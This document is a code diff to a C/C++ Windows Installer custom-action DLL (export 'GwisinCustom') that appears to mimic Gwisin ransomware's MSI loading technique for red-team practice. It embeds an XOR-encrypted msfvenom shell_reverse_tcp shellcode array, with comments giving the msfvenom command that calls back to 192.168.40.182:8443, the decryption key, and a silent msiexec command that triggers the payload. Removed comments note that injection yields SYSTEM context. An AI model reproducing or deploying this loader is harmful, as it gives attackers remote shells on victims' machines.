@@ -5,13 +5,7 @@
 #include <Msiquery.h> 
 #pragma comment(lib, "msi.lib")
 
-// Project > Project properties > c/c++ > preprocessor > processor definition - _CRT_SECURE_NO_WARNINGS 
-// Project > Project properties > Charset > Multi-byte 
-
-// msiexec -> notepad -> msiexec and notepad both dies with werfault -> rundll32, cmd, connhost becomes orphan - NOT even under explorer.exe! It's just running as SYSTEM 
-// injecting to notepad gives SYSTEM context 
-// injecting to certreq gives user context ? 
-
+// credit: Sektor7 RTO Malware Essential Course 
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
 	int j;
 
@@ -28,10 +22,8 @@ extern "C" __declspec(dllexport) UINT __stdcall GwisinCustom(MSIHANDLE hInstall)
 	PROCESS_INFORMATION processInformation;
 	STARTUPINFO startupInfo;
 	BOOL creationResult;
-
-	// Every change requires deleting/re-adding dll to the msi 
-	// meterpreter doesn't work, but shell_reverse_tcp does. Not sure? bad byte?  
-	// msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.40.182 lport=8443 exitfunc=thread --encrypt xor --encrypt-key "serialmorelikecereal"  -f c
+ 
+	// msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.40.182 lport=8443 exitfunc=thread --encrypt xor --encrypt-key "serialmorelikecereal" -f c
 	// msiexec.exe /qn /i <msi-filepath> SERIAL=serialmorelikecereal
 	unsigned char buf[] =
 		"\x8f\x2d\xf1\x8d\x91\x84\xa1\x6f\x72\x65\x2d\x38\x2a\x35\x31"
@@ -73,7 +65,7 @@ extern "C" __declspec(dllexport) UINT __stdcall GwisinCustom(MSIHANDLE hInstall)
 	char msiPropValue[256];
 	DWORD msiPropLength = 256;
 
-	//// Get custom action data from commandline. ex) msiexec /qn /i <msi-path> SERIAL=<serial> LICENSE=<license> 
+	// Get custom action data from commandline. ex) msiexec /qn /i <msi-path> SERIAL=<serial> LICENSE=<license> 
 	MsiGetProperty(hInstall, TEXT("CustomActionData"), msiPropValue, &msiPropLength);
 
 	char* tSerial = strtok((char*)msiPropValue, " ");
